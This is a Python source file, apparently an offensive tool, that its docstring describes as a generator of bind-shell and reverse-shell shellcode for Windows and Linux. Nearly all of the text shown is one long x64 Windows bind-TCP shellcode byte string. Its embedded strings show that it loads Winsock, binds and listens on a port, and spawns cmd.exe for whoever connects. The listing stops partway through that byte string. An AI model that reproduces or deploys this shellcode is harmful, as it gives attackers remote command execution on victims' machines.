import socket
import struct
import binascii

"""
Description: Generates shellcodes for windows and linux.
Payload Types: Bind Shells and Reverse Shells
"""

"""
Problems possible solutions:

Write Windows Shellcodes full on assembly for more optimized code (less bytes)
IPv6 possible solution: Create space with NOPs
"""

def hex_format(bytes_obj):
    formatted = ''
    counter = 0
    for byte in bytes_obj:
        counter += 1
        formatted += '\\x'
        formatted += '%02x' % byte
        # 15 bytes in a row
        if ((counter) % 15 == 0):
            formatted += "\n"
    return formatted

class generate_bind_shell:
    """
    Generate bind shell shellcode
    """

    def windows_bind_tcp(port):
        """
        Replaces PORT
        """

        code =  ""
        code += "\\x56\\x48\\x8B\\xF4\\x48\\x83\\xE4\\xF0\\x48\\x83\\xEC\\x20\\xE8\\x05\\x00"
        code += "\\x00\\x00\\x48\\x8B\\xE6\\x5E\\xC3\\x56\\x57\\x48\\x81\\xEC\\xE8\\x03\\x00"
        code += "\\x00\\x48\\x8D\\x8C\\x24\\x30\\x01\\x00\\x00\\xE8\\x07\\x06\\x00\\x00\\x0F"
        code += "\\xB6\\xC0\\x85\\xC0\\x75\\x0A\\xB8\\x01\\x00\\x00\\x00\\xE9\\x07\\x03\\x00"
        code += "\\x00\\x48\\x8D\\x84\\x24\\x60\\x01\\x00\\x00\\x48\\x8B\\xF8\\x33\\xC0\\xB9"
        code += "\\x68\\x00\\x00\\x00\\xF3\\xAA\\x48\\x8D\\x84\\x24\\x80\\x00\\x00\\x00\\x48"
        code += "\\x8B\\xF8\\x33\\xC0\\xB9\\x18\\x00\\x00\\x00\\xF3\\xAA\\x48\\x8D\\x94\\x24"
        code += "\\xA0\\x00\\x00\\x00\\x48\\x8D\\x8C\\x24\\x30\\x01\\x00\\x00\\xE8\\xD4\\x02"
        code += "\\x00\\x00\\x0F\\xB6\\xC0\\x85\\xC0\\x75\\x07\\x33\\xC0\\xE9\\xBC\\x02\\x00"
        code += "\\x00\\x48\\x8D\\x94\\x24\\x40\\x02\\x00\\x00\\x66\\xB9\\x02\\x02\\xFF\\x94"
        code += "\\x24\\xA0\\x00\\x00\\x00\\x89\\x44\\x24\\x50\\x83\\x7C\\x24\\x50\\x00\\x74"
        code += "\\x0A\\xB8\\x01\\x00\\x00\\x00\\xE9\\x94\\x02\\x00\\x00\\xC7\\x44\\x24\\x28"
        code += "\\x00\\x00\\x00\\x00\\xC7\\x44\\x24\\x20\\x00\\x00\\x00\\x00\\x45\\x33\\xC9"
        code += "\\x41\\xB8\\x06\\x00\\x00\\x00\\xBA\\x01\\x00\\x00\\x00\\xB9\\x02\\x00\\x00"
        code += "\\x00\\xFF\\x94\\x24\\x18\\x01\\x00\\x00\\x48\\x89\\x44\\x24\\x58\\x48\\x83"
        code += "\\x7C\\x24\\x58\\xFF\\x75\\x11\\xFF\\x94\\x24\\x08\\x01\\x00\\x00\\xB8\\x01"
        code += "\\x00\\x00\\x00\\xE9\\x4C\\x02\\x00\\x00\\xB8\\x02\\x00\\x00\\x00\\x66\\x89"
        code += "\\x44\\x24\\x70\\x33\\xC9\\xFF\\x94\\x24\\xF0\\x00\\x00\\x00\\x89\\x44\\x24"
        code += "\\x74\\x66\\xB9\\xBB\\x01\\xFF\\x94\\x24\\xE8\\x00\\x00\\x00\\x66\\x89\\x44"
        code += "\\x24\\x72\\x41\\xB8\\x10\\x00\\x00\\x00\\x48\\x8D\\x54\\x24\\x70\\x48\\x8B"
        code += "\\x4C\\x24\\x58\\xFF\\x94\\x24\\xB8\\x00\\x00\\x00\\x89\\x44\\x24\\x50\\x83"
        code += "\\x7C\\x24\\x50\\xFF\\x75\\x1D\\x48\\x8B\\x4C\\x24\\x58\\xFF\\x94\\x24\\xE0"
        code += "\\x00\\x00\\x00\\xFF\\x94\\x24\\x08\\x01\\x00\\x00\\xB8\\x01\\x00\\x00\\x00"
        code += "\\xE9\\xE6\\x01\\x00\\x00\\xBA\\xFF\\xFF\\xFF\\x7F\\x48\\x8B\\x4C\\x24\\x58"
        code += "\\xFF\\x94\\x24\\xC0\\x00\\x00\\x00\\x89\\x44\\x24\\x50\\x83\\x7C\\x24\\x50"
        code += "\\xFF\\x75\\x1D\\x48\\x8B\\x4C\\x24\\x58\\xFF\\x94\\x24\\xE0\\x00\\x00\\x00"
        code += "\\xFF\\x94\\x24\\x08\\x01\\x00\\x00\\xB8\\x01\\x00\\x00\\x00\\xE9\\xAD\\x01"
        code += "\\x00\\x00\\xC7\\x44\\x24\\x68\\x10\\x00\\x00\\x00\\x4C\\x8D\\x44\\x24\\x68"
        code += "\\x48\\x8D\\x94\\x24\\x08\\x02\\x00\\x00\\x48\\x8B\\x4C\\x24\\x58\\xFF\\x94"
        code += "\\x24\\xC8\\x00\\x00\\x00\\x48\\x89\\x44\\x24\\x60\\x48\\x83\\x7C\\x24\\x60"
        code += "\\xFF\\x75\\x1D\\x48\\x8B\\x4C\\x24\\x58\\xFF\\x94\\x24\\xE0\\x00\\x00\\x00"
        code += "\\xFF\\x94\\x24\\x08\\x01\\x00\\x00\\xB8\\x01\\x00\\x00\\x00\\xE9\\x62\\x01"
        code += "\\x00\\x00\\xBA\\x68\\x00\\x00\\x00\\x48\\x8D\\x8C\\x24\\x60\\x01\\x00\\x00"
        code += "\\xE8\\x73\\x0A\\x00\\x00\\xC7\\x84\\x24\\x60\\x01\\x00\\x00\\x68\\x00\\x00"
        code += "\\x00\\xC7\\x84\\x24\\x9C\\x01\\x00\\x00\\x01\\x01\\x00\\x00\\x48\\x8B\\x44"
        code += "\\x24\\x60\\x48\\x89\\x84\\x24\\xB0\\x01\\x00\\x00\\x48\\x8B\\x44\\x24\\x60"
        code += "\\x48\\x89\\x84\\x24\\xB8\\x01\\x00\\x00\\x48\\x8B\\x44\\x24\\x60\\x48\\x89"
        code += "\\x84\\x24\\xC0\\x01\\x00\\x00\\x48\\x8D\\x84\\x24\\xD0\\x01\\x00\\x00\\xE8"
        code += "\\x38\\x00\\x00\\x00\\x43\\x00\\x3A\\x00\\x5C\\x00\\x57\\x00\\x69\\x00\\x6E"
        code += "\\x00\\x64\\x00\\x6F\\x00\\x77\\x00\\x73\\x00\\x5C\\x00\\x53\\x00\\x79\\x00"
        code += "\\x73\\x00\\x74\\x00\\x65\\x00\\x6D\\x00\\x33\\x00\\x32\\x00\\x5C\\x00\\x63"
        code += "\\x00\\x6D\\x00\\x64\\x00\\x2E\\x00\\x65\\x00\\x78\\x00\\x65\\x00\\x00\\x00"
        code += "\\x59\\x48\\x8B\\xF8\\x48\\x8B\\xF1\\xB9\\x38\\x00\\x00\\x00\\xF3\\xA4\\x48"
        code += "\\x8D\\x84\\x24\\x80\\x00\\x00\\x00\\x48\\x89\\x44\\x24\\x48\\x48\\x8D\\x84"
        code += "\\x24\\x60\\x01\\x00\\x00\\x48\\x89\\x44\\x24\\x40\\x48\\xC7\\x44\\x24\\x38"
        code += "\\x00\\x00\\x00\\x00\\x48\\xC7\\x44\\x24\\x30\\x00\\x00\\x00\\x00\\xC7\\x44"
        code += "\\x24\\x28\\x10\\x00\\x00\\x00\\xC7\\x44\\x24\\x20\\x01\\x00\\x00\\x00\\x45"
        code += "\\x33\\xC9\\x45\\x33\\xC0\\xE8\\x16\\x00\\x00\\x00\\x2F\\x00\\x63\\x00\\x20"
        code += "\\x00\\x63\\x00\\x6D\\x00\\x64\\x00\\x2E\\x00\\x65\\x00\\x78\\x00\\x65\\x00"
        code += "\\x00\\x00\\x5A\\x48\\x8D\\x8C\\x24\\xD0\\x01\\x00\\x00\\xFF\\x94\\x24\\x40"
        code += "\\x01\\x00\\x00\\xBA\\xFF\\xFF\\xFF\\xFF\\x48\\x8B\\x8C\\x24\\x80\\x00\\x00"
        code += "\\x00\\xFF\\x94\\x24\\x50\\x01\\x00\\x00\\x48\\x8B\\x8C\\x24\\x80\\x00\\x00"
        code += "\\x00\\xFF\\x94\\x24\\x58\\x01\\x00\\x00\\x48\\x8B\\x8C\\x24\\x88\\x00\\x00"
        code += "\\x00\\xFF\\x94\\x24\\x58\\x01\\x00\\x00\\x48\\x8B\\x4C\\x24\\x58\\xFF\\x94"
        code += "\\x24\\xE0\\x00\\x00\\x00\\x48\\x8B\\x4C\\x24\\x60\\xFF\\x94\\x24\\xE0\\x00"
        code += "\\x00\\x00\\xFF\\x94\\x24\\x08\\x01\\x00\\x00\\x33\\xC0\\x48\\x81\\xC4\\xE8"
        code += "\\x03\\x00\\x00\\x5F\\x5E\\xC3\\x48\\x89\\x54\\x24\\x10\\x48\\x89\\x4C\\x24"
        code += "\\x08\\x48\\x83\\xEC\\x38\\xE8\\x10\\x00\\x00\\x00\\x57\\x53\\x32\\x5F\\x33"
        code += "\\x32\\x2E\\x64\\x6C\\x6C\\x00\\x00\\x00\\x00\\x00\\x00\\x59\\x48\\x8B\\x44"
        code += "\\x24\\x40\\xFF\\x10\\x48\\x89\\x44\\x24\\x20\\xE8\\x0C\\x00\\x00\\x00\\x57"
        code += "\\x53\\x41\\x53\\x74\\x61\\x72\\x74\\x75\\x70\\x00\\x00\\x5A\\x48\\x8B\\x4C"
        code += "\\x24\\x20\\x48\\x8B\\x44\\x24\\x40\\xFF\\x50\\x08\\x48\\x8B\\x4C\\x24\\x48"
        code += "\\x48\\x89\\x01\\xE8\\x0C\\x00\\x00\\x00\\x73\\x6F\\x63\\x6B\\x65\\x74\\x00"
        code += "\\x00\\x00\\x00\\x00\\x00\\x5A\\x48\\x8B\\x4C\\x24\\x20\\x48\\x8B\\x44\\x24"
        code += "\\x40\\xFF\\x50\\x08\\x48\\x8B\\x4C\\x24\\x48\\x48\\x89\\x41\\x08\\xE8\\x0C"
        code += "\\x00\\x00\\x00\\x69\\x6E\\x65\\x74\\x5F\\x61\\x64\\x64\\x72\\x00\\x00\\x00"
        code += "\\x5A\\x48\\x8B\\x4C\\x24\\x20\\x48\\x8B\\x44\\x24\\x40\\xFF\\x50\\x08\\x48"
        code += "\\x8B\\x4C\\x24\\x48\\x48\\x89\\x41\\x10\\xE8\\x08\\x00\\x00\\x00\\x62\\x69"
        code += "\\x6E\\x64\\x00\\x00\\x00\\x00\\x5A\\x48\\x8B\\x4C\\x24\\x20\\x48\\x8B\\x44"
        code += "\\x24\\x40\\xFF\\x50\\x08\\x48\\x8B\\x4C\\x24\\x48\\x48\\x89\\x41\\x18\\xE8"
        code += "\\x08\\x00\\x00\\x00\\x6C\\x69\\x73\\x74\\x65\\x6E\\x00\\x00\\x5A\\x48\\x8B"
        code += "\\x4C\\x24\\x20\\x48\\x8B\\x44\\x24\\x40\\xFF\\x50\\x08\\x48\\x8B\\x4C\\x24"
        code += "\\x48\\x48\\x89\\x41\\x20\\xE8\\x08\\x00\\x00\\x00\\x61\\x63\\x63\\x65\\x70"
        code += "\\x74\\x00\\x00\\x5A\\x48\\x8B\\x4C\\x24\\x20\\x48\\x8B\\x44\\x24\\x40\\xFF"
        code += "\\x50\\x08\\x48\\x8B\\x4C\\x24\\x48\\x48\\x89\\x41\\x28\\xE8\\x08\\x00\\x00"
        code += "\\x00\\x72\\x65\\x63\\x76\\x00\\x00\\x00\\x00\\x5A\\x48\\x8B\\x4C\\x24\\x20"
        code += "\\x48\\x8B\\x44\\x24\\x40\\xFF\\x50\\x08\\x48\\x8B\\x4C\\x24\\x48\\x48\\x89"
        code += "\\x41\\x30\\xE8\\x0C\\x00\\x00\\x00\\x73\\x65\\x6E\\x64\\x00\\x00\\x00\\x00"
        code += "\\x00\\x00\\x00\\x00\\x5A\\x48\\x8B\\x4C\\x24\\x20\\x48\\x8B\\x44\\x24\\x40"
        code += "\\xFF\\x50\\x08\\x48\\x8B\\x4C\\x24\\x48\\x48\\x89\\x41\\x38\\xE8\\x0C\\x00"
        code += "\\x00\\x00\\x63\\x6C\\x6F\\x73\\x65\\x73\\x6F\\x63\\x6B\\x65\\x74\\x00\\x5A"
        code += "\\x48\\x8B\\x4C\\x24\\x20\\x48\\x8B\\x44\\x24\\x40\\xFF\\x50\\x08\\x48\\x8B"
        code += "\\x4C\\x24\\x48\\x48\\x89\\x41\\x40\\xE8\\x08\\x00\\x00\\x00\\x68\\x74\\x6F"
        code += "\\x6E\\x73\\x00\\x00\\x00\\x5A\\x48\\x8B\\x4C\\x24\\x20\\x48\\x8B\\x44\\x24"
        code += "\\x40\\xFF\\x50\\x08\\x48\\x8B\\x4C\\x24\\x48\\x48\\x89\\x41\\x48\\xE8\\x0C"
        code += "\\x00\\x00\\x00\\x68\\x74\\x6F\\x6E\\x6C\\x00\\x00\\x00\\x00\\x00\\x00\\x00"
        code += "\\x5A\\x48\\x8B\\x4C\\x24\\x20\\x48\\x8B\\x44\\x24\\x40\\xFF\\x50\\x08\\x48"
        code += "\\x8B\\x4C\\x24\\x48\\x48\\x89\\x41\\x50\\xE8\\x10\\x00\\x00\\x00\\x67\\x65"
        code += "\\x74\\x61\\x64\\x64\\x72\\x69\\x6E\\x66\\x6F\\x00\\x00\\x00\\x00\\x00\\x5A"
        code += "\\x48\\x8B\\x4C\\x24\\x20\\x48\\x8B\\x44\\x24\\x40\\xFF\\x50\\x08\\x48\\x8B"
        code += "\\x4C\\x24\\x48\\x48\\x89\\x41\\x58\\xE8\\x10\\x00\\x00\\x00\\x66\\x72\\x65"
        code += "\\x65\\x61\\x64\\x64\\x72\\x69\\x6E\\x66\\x6F\\x00\\x00\\x00\\x00\\x5A\\x48"
        code += "\\x8B\\x4C\\x24\\x20\\x48\\x8B\\x44\\x24\\x40\\xFF\\x50\\x08\\x48\\x8B\\x4C"
        code += "\\x24\\x48\\x48\\x89\\x41\\x60\\xE8\\x10\\x00\\x00\\x00\\x57\\x53\\x41\\x43"
        code += "\\x6C\\x65\\x61\\x6E\\x75\\x70\\x00\\x00\\x00\\x00\\x00\\x00\\x5A\\x48\\x8B"
        code += "\\x4C\\x24\\x20\\x48\\x8B\\x44\\x24\\x40\\xFF\\x50\\x08\\x48\\x8B\\x4C\\x24"
        code += "\\x48\\x48\\x89\\x41\\x68\\xE8\\x10\\x00\\x00\\x00\\x57\\x53\\x41\\x43\\x6F"
        code += "\\x6E\\x6E\\x65\\x63\\x74\\x00\\x00\\x00\\x00\\x00\\x00\\x5A\\x48\\x8B\\x4C"
        code += "\\x24\\x20\\x48\\x8B\\x44\\x24\\x40\\xFF\\x50\\x08\\x48\\x8B\\x4C\\x24\\x48"
        code += "\\x48\\x89\\x41\\x70\\xE8\\x10\\x00\\x00\\x00\\x57\\x53\\x41\\x41\\x63\\x63"
        code += "\\x65\\x70\\x74\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x5A\\x48\\x8B\\x4C\\x24"
        code += "\\x20\\x48\\x8B\\x44\\x24\\x40\\xFF\\x50\\x08\\x48\\x8B\\x4C\\x24\\x48\\x48"
        code += "\\x89\\x81\\x80\\x00\\x00\\x00\\xE8\\x10\\x00\\x00\\x00\\x57\\x53\\x41\\x53"
        code += "\\x6F\\x63\\x6B\\x65\\x74\\x41\\x00\\x00\\x00\\x00\\x00\\x00\\x5A\\x48\\x8B"
        code += "\\x4C\\x24\\x20\\x48\\x8B\\x44\\x24\\x40\\xFF\\x50\\x08\\x48\\x8B\\x4C\\x24"
        code += "\\x48\\x48\\x89\\x41\\x78\\xB0\\x01\\x48\\x83\\xC4\\x38\\xC3\\x48\\x89\\x4C"
        code += "\\x24\\x08\\x48\\x83\\xEC\\x68\\xE8\\x20\\x00\\x00\\x00\\x6B\\x00\\x65\\x00"
        code += "\\x72\\x00\\x6E\\x00\\x65\\x00\\x6C\\x00\\x33\\x00\\x32\\x00\\x2E\\x00\\x64"
        code += "\\x00\\x6C\\x00\\x6C\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x59\\xE8"
        code += "\\xDB\\x03\\x00\\x00\\x48\\x89\\x44\\x24\\x20\\x48\\x83\\x7C\\x24\\x20\\x00"
        code += "\\x75\\x07\\x32\\xC0\\xE9\\x92\\x01\\x00\\x00\\xE8\\x10\\x00\\x00\\x00\\x4C"
        code += "\\x6F\\x61\\x64\\x4C\\x69\\x62\\x72\\x61\\x72\\x79\\x41\\x00\\x00\\x00\\x00"
        code += "\\x5A\\x48\\x8B\\x4C\\x24\\x20\\xE8\\x77\\x01\\x00\\x00\\x48\\x89\\x44\\x24"
        code += "\\x30\\x48\\x83\\x7C\\x24\\x30\\x00\\x75\\x07\\x32\\xC0\\xE9\\x5E\\x01\\x00"
        code += "\\x00\\xE8\\x10\\x00\\x00\\x00\\x47\\x65\\x74\\x50\\x72\\x6F\\x63\\x41\\x64"
        code += "\\x64\\x72\\x65\\x73\\x73\\x00\\x00\\x5A\\x48\\x8B\\x4C\\x24\\x20\\xE8\\x43"
        code += "\\x01\\x00\\x00\\x48\\x89\\x44\\x24\\x38\\x48\\x83\\x7C\\x24\\x38\\x00\\x75"
        code += "\\x07\\x32\\xC0\\xE9\\x2A\\x01\\x00\\x00\\xE8\\x10\\x00\\x00\\x00\\x43\\x72"
        code += "\\x65\\x61\\x74\\x65\\x50\\x72\\x6F\\x63\\x65\\x73\\x73\\x57\\x00\\x00\\x5A"
        code += "\\x48\\x8B\\x4C\\x24\\x20\\xE8\\x0F\\x01\\x00\\x00\\x48\\x89\\x44\\x24\\x28"
        code += "\\x48\\x83\\x7C\\x24\\x28\\x00\\x75\\x07\\x32\\xC0\\xE9\\xF6\\x00\\x00\\x00"
        code += "\\xE8\\x10\\x00\\x00\\x00\\x45\\x78\\x69\\x74\\x50\\x72\\x6F\\x63\\x65\\x73"
        code += "\\x73\\x00\\x00\\x00\\x00\\x00\\x5A\\x48\\x8B\\x4C\\x24\\x20\\xE8\\xDB\\x00"
        code += "\\x00\\x00\\x48\\x89\\x44\\x24\\x50\\x48\\x83\\x7C\\x24\\x50\\x00\\x75\\x07"
        code += "\\x32\\xC0\\xE9\\xC2\\x00\\x00\\x00\\xE8\\x18\\x00\\x00\\x00\\x57\\x61\\x69"
        code += "\\x74\\x46\\x6F\\x72\\x53\\x69\\x6E\\x67\\x6C\\x65\\x4F\\x62\\x6A\\x65\\x63"
        code += "\\x74\\x00\\x00\\x00\\x00\\x00\\x5A\\x48\\x8B\\x4C\\x24\\x20\\xE8\\x9F\\x00"
        code += "\\x00\\x00\\x48\\x89\\x44\\x24\\x40\\x48\\x83\\x7C\\x24\\x40\\x00\\x75\\x07"
        code += "\\x32\\xC0\\xE9\\x86\\x00\\x00\\x00\\xE8\\x10\\x00\\x00\\x00\\x43\\x6C\\x6F"
        code += "\\x73\\x65\\x48\\x61\\x6E\\x64\\x6C\\x65\\x00\\x00\\x00\\x00\\x00\\x5A\\x48"
        code += "\\x8B\\x4C\\x24\\x20\\xE8\\x6B\\x00\\x00\\x00\\x48\\x89\\x44\\x24\\x48\\x48"
        code += "\\x83\\x7C\\x24\\x48\\x00\\x75\\x04\\x32\\xC0\\xEB\\x55\\x48\\x8B\\x44\\x24"
        code += "\\x70\\x48\\x8B\\x4C\\x24\\x30\\x48\\x89\\x08\\x48\\x8B\\x44\\x24\\x70\\x48"
        code += "\\x8B\\x4C\\x24\\x38\\x48\\x89\\x48\\x08\\x48\\x8B\\x44\\x24\\x70\\x48\\x8B"
        code += "\\x4C\\x24\\x28\\x48\\x89\\x48\\x10\\x48\\x8B\\x44\\x24\\x70\\x48\\x8B\\x4C"
        code += "\\x24\\x28\\x48\\x89\\x48\\x18\\x48\\x8B\\x44\\x24\\x70\\x48\\x8B\\x4C\\x24"
        code += "\\x40\\x48\\x89\\x48\\x20\\x48\\x8B\\x44\\x24\\x70\\x48\\x8B\\x4C\\x24\\x48"
        code += "\\x48\\x89\\x48\\x28\\xB0\\x01\\x48\\x83\\xC4\\x68\\xC3\\x48\\x89\\x54\\x24"
        code += "\\x10\\x48\\x89\\x4C\\x24\\x08\\x48\\x83\\xEC\\x78\\x48\\x8B\\x84\\x24\\x80"
        code += "\\x00\\x00\\x00\\x48\\x89\\x44\\x24\\x30\\x48\\x8B\\x44\\x24\\x30\\x0F\\xB7"
        code += "\\x00\\x3D\\x4D\\x5A\\x00\\x00\\x74\\x07\\x33\\xC0\\xE9\\xFA\\x01\\x00\\x00"
        code += "\\x48\\x8B\\x44\\x24\\x30\\x48\\x63\\x40\\x3C\\x48\\x8B\\x8C\\x24\\x80\\x00"
        code += "\\x00\\x00\\x48\\x03\\xC8\\x48\\x8B\\xC1\\x48\\x89\\x44\\x24\\x40\\xB8\\x08"
        code += "\\x00\\x00\\x00\\x48\\x6B\\xC0\\x00\\x48\\x8B\\x4C\\x24\\x40\\x48\\x8D\\x84"
        code += "\\x01\\x88\\x00\\x00\\x00\\x48\\x89\\x44\\x24\\x38\\x48\\x8B\\x44\\x24\\x38"
        code += "\\x83\\x38\\x00\\x75\\x07\\x33\\xC0\\xE9\\xB2\\x01\\x00\\x00\\x48\\x8B\\x44"
        code += "\\x24\\x38\\x8B\\x00\\x89\\x44\\x24\\x18\\x8B\\x44\\x24\\x18\\x48\\x03\\x84"
        code += "\\x24\\x80\\x00\\x00\\x00\\x48\\x89\\x44\\x24\\x10\\x48\\x8B\\x44\\x24\\x10"
        code += "\\x8B\\x40\\x18\\x48\\x89\\x44\\x24\\x48\\x48\\x8B\\x44\\x24\\x10\\x8B\\x40"
        code += "\\x1C\\x89\\x44\\x24\\x24\\x48\\x8B\\x44\\x24\\x10\\x8B\\x40\\x20\\x89\\x44"
        code += "\\x24\\x1C\\x48\\x8B\\x44\\x24\\x10\\x8B\\x40\\x24\\x89\\x44\\x24\\x20\\x48"
        code += "\\xC7\\x44\\x24\\x08\\x00\\x00\\x00\\x00\\xEB\\x0D\\x48\\x8B\\x44\\x24\\x08"
        code += "\\x48\\xFF\\xC0\\x48\\x89\\x44\\x24\\x08\\x48\\x8B\\x44\\x24\\x48\\x48\\x39"
        code += "\\x44\\x24\\x08\\x0F\\x83\\x3B\\x01\\x00\\x00\\x8B\\x44\\x24\\x1C\\x48\\x8B"
        code += "\\x8C\\x24\\x80\\x00\\x00\\x00\\x48\\x03\\xC8\\x48\\x8B\\xC1\\x48\\x8B\\x4C"
        code += "\\x24\\x08\\x48\\x8D\\x04\\x88\\x48\\x89\\x44\\x24\\x58\\x8B\\x44\\x24\\x20"
        code += "\\x48\\x8B\\x8C\\x24\\x80\\x00\\x00\\x00\\x48\\x03\\xC8\\x48\\x8B\\xC1\\x48"
        code += "\\x8B\\x4C\\x24\\x08\\x48\\x8D\\x04\\x48\\x48\\x89\\x44\\x24\\x50\\x8B\\x44"
        code += "\\x24\\x24\\x48\\x8B\\x8C\\x24\\x80\\x00\\x00\\x00\\x48\\x03\\xC8\\x48\\x8B"
        code += "\\xC1\\x48\\x8B\\x4C\\x24\\x50\\x0F\\xB7\\x09\\x48\\x8D\\x04\\x88\\x48\\x89"
        code += "\\x44\\x24\\x60\\x48\\x8B\\x44\\x24\\x58\\x8B\\x00\\x48\\x8B\\x8C\\x24\\x80"
        code += "\\x00\\x00\\x00\\x48\\x03\\xC8\\x48\\x8B\\xC1\\x48\\x89\\x44\\x24\\x28\\x48"
        code += "\\xC7\\x04\\x24\\x00\\x00\\x00\\x00\\xEB\\x0B\\x48\\x8B\\x04\\x24\\x48\\xFF"
        code += "\\xC0\\x48\\x89\\x04\\x24\\x48\\x8B\\x04\\x24\\x48\\x8B\\x8C\\x24\\x88\\x00"
        code += "\\x00\\x00\\x48\\x03\\xC8\\x48\\x8B\\xC1\\x0F\\xBE\\x00\\x85\\xC0\\x74\\x45"
        code += "\\x48\\x8B\\x04\\x24\\x48\\x8B\\x4C\\x24\\x28\\x48\\x03\\xC8\\x48\\x8B\\xC1"
        code += "\\x0F\\xBE\\x00\\x85\\xC0\\x74\\x2F\\x48\\x8B\\x04\\x24\\x48\\x8B\\x8C\\x24"
        code += "\\x88\\x00\\x00\\x00\\x48\\x03\\xC8\\x48\\x8B\\xC1\\x0F\\xBE\\x00\\x48\\x8B"
        code += "\\x0C\\x24\\x48\\x8B\\x54\\x24\\x28\\x48\\x03\\xD1\\x48\\x8B\\xCA\\x0F\\xBE"
        code += "\\x09\\x3B\\xC1\\x74\\x02\\xEB\\x02\\xEB\\x97\\x48\\x8B\\x04\\x24\\x48\\x8B"
        code += "\\x8C\\x24\\x88\\x00\\x00\\x00\\x48\\x03\\xC8\\x48\\x8B\\xC1\\x0F\\xBE\\x00"
        code += "\\x85\\xC0\\x75\\x2D\\x48\\x8B\\x04\\x24\\x48\\x8B\\x4C\\x24\\x28\\x48\\x03"
        code += "\\xC8\\x48\\x8B\\xC1\\x0F\\xBE\\x00\\x85\\xC0\\x75\\x17\\x48\\x8B\\x44\\x24"
        code += "\\x60\\x8B\\x00\\x48\\x8B\\x8C\\x24\\x80\\x00\\x00\\x00\\x48\\x03\\xC8\\x48"
        code += "\\x8B\\xC1\\xEB\\x07\\xE9\\xA8\\xFE\\xFF\\xFF\\x33\\xC0\\x48\\x83\\xC4\\x78"
        code += "\\xC3\\x48\\x89\\x4C\\x24\\x08\\x48\\x83\\xEC\\x58\\x65\\x48\\x8B\\x04\\x25"
        code += "\\x60\\x00\\x00\\x00\\x48\\x89\\x44\\x24\\x40\\x48\\x8B\\x44\\x24\\x40\\x48"
        code += "\\x8B\\x40\\x18\\x48\\x89\\x44\\x24\\x48\\x48\\x8B\\x44\\x24\\x48\\x48\\x83"
        code += "\\xC0\\x20\\x48\\x89\\x44\\x24\\x38\\x48\\x8B\\x44\\x24\\x38\\x48\\x8B\\x00"
        code += "\\x48\\x89\\x44\\x24\\x30\\xEB\\x0D\\x48\\x8B\\x44\\x24\\x30\\x48\\x8B\\x00"
        code += "\\x48\\x89\\x44\\x24\\x30\\x48\\x8B\\x44\\x24\\x38\\x48\\x39\\x44\\x24\\x30"
        code += "\\x0F\\x84\\xBF\\x01\\x00\\x00\\x48\\x8B\\x44\\x24\\x30\\x48\\x83\\xE8\\x10"
        code += "\\x48\\x89\\x44\\x24\\x28\\x48\\x83\\x7C\\x24\\x28\\x00\\x74\\x0C\\x48\\x8B"
        code += "\\x44\\x24\\x28\\x48\\x83\\x78\\x30\\x00\\x75\\x05\\xE9\\x98\\x01\\x00\\x00"
        code += "\\x48\\x8B\\x44\\x24\\x28\\x48\\x8B\\x40\\x60\\x48\\x89\\x44\\x24\\x10\\x48"
        code += "\\x83\\x7C\\x24\\x10\\x00\\x75\\x02\\xEB\\xA4\\x48\\xC7\\x04\\x24\\x00\\x00"
        code += "\\x00\\x00\\xEB\\x0B\\x48\\x8B\\x04\\x24\\x48\\xFF\\xC0\\x48\\x89\\x04\\x24"
        code += "\\x48\\x8B\\x44\\x24\\x28\\x0F\\xB7\\x40\\x58\\x48\\x39\\x04\\x24\\x0F\\x83"
        code += "\\x26\\x01\\x00\\x00\\x48\\x8B\\x44\\x24\\x60\\x48\\x8B\\x0C\\x24\\x0F\\xB7"
        code += "\\x04\\x48\\x85\\xC0\\x74\\x11\\x48\\x8B\\x44\\x24\\x10\\x48\\x8B\\x0C\\x24"
        code += "\\x0F\\xB7\\x04\\x48\\x85\\xC0\\x75\\x05\\xE9\\xFF\\x00\\x00\\x00\\x48\\x8B"
        code += "\\x44\\x24\\x60\\x48\\x8B\\x0C\\x24\\x0F\\xB7\\x04\\x48\\x83\\xF8\\x5A\\x7F"
        code += "\\x47\\x48\\x8B\\x44\\x24\\x60\\x48\\x8B\\x0C\\x24\\x0F\\xB7\\x04\\x48\\x83"
        code += "\\xF8\\x41\\x7C\\x35\\x48\\x8B\\x44\\x24\\x60\\x48\\x8B\\x0C\\x24\\x0F\\xB7"
        code += "\\x04\\x48\\x83\\xE8\\x41\\x83\\xC0\\x61\\x89\\x44\\x24\\x20\\x48\\x8B\\x44"
        code += "\\x24\\x60\\x48\\x8B\\x0C\\x24\\x0F\\xB7\\x54\\x24\\x20\\x66\\x89\\x14\\x48"
        code += "\\x0F\\xB7\\x44\\x24\\x20\\x66\\x89\\x44\\x24\\x08\\xEB\\x12\\x48\\x8B\\x44"
        code += "\\x24\\x60\\x48\\x8B\\x0C\\x24\\x0F\\xB7\\x04\\x48\\x66\\x89\\x44\\x24\\x08"
        code += "\\x0F\\xB7\\x44\\x24\\x08\\x66\\x89\\x44\\x24\\x18\\x48\\x8B\\x44\\x24\\x10"
        code += "\\x48\\x8B\\x0C\\x24\\x0F\\xB7\\x04\\x48\\x83\\xF8\\x5A\\x7F\\x47\\x48\\x8B"
        code += "\\x44\\x24\\x10\\x48\\x8B\\x0C\\x24\\x0F\\xB7\\x04\\x48\\x83\\xF8\\x41\\x7C"
        code += "\\x35\\x48\\x8B\\x44\\x24\\x10\\x48\\x8B\\x0C\\x24\\x0F\\xB7\\x04\\x48\\x83"
        code += "\\xE8\\x41\\x83\\xC0\\x61\\x89\\x44\\x24\\x24\\x48\\x8B\\x44\\x24\\x10\\x48"
        code += "\\x8B\\x0C\\x24\\x0F\\xB7\\x54\\x24\\x24\\x66\\x89\\x14\\x48\\x0F\\xB7\\x44"
        code += "\\x24\\x24\\x66\\x89\\x44\\x24\\x0A\\xEB\\x12\\x48\\x8B\\x44\\x24\\x10\\x48"
        code += "\\x8B\\x0C\\x24\\x0F\\xB7\\x04\\x48\\x66\\x89\\x44\\x24\\x0A\\x0F\\xB7\\x44"
        code += "\\x24\\x0A\\x66\\x89\\x44\\x24\\x1C\\x0F\\xB7\\x44\\x24\\x18\\x0F\\xB7\\x4C"
        code += "\\x24\\x1C\\x3B\\xC1\\x74\\x02\\xEB\\x05\\xE9\\xBC\\xFE\\xFF\\xFF\\x48\\x8B"
        code += "\\x44\\x24\\x60\\x48\\x8B\\x0C\\x24\\x0F\\xB7\\x04\\x48\\x85\\xC0\\x75\\x1C"
        code += "\\x48\\x8B\\x44\\x24\\x10\\x48\\x8B\\x0C\\x24\\x0F\\xB7\\x04\\x48\\x85\\xC0"
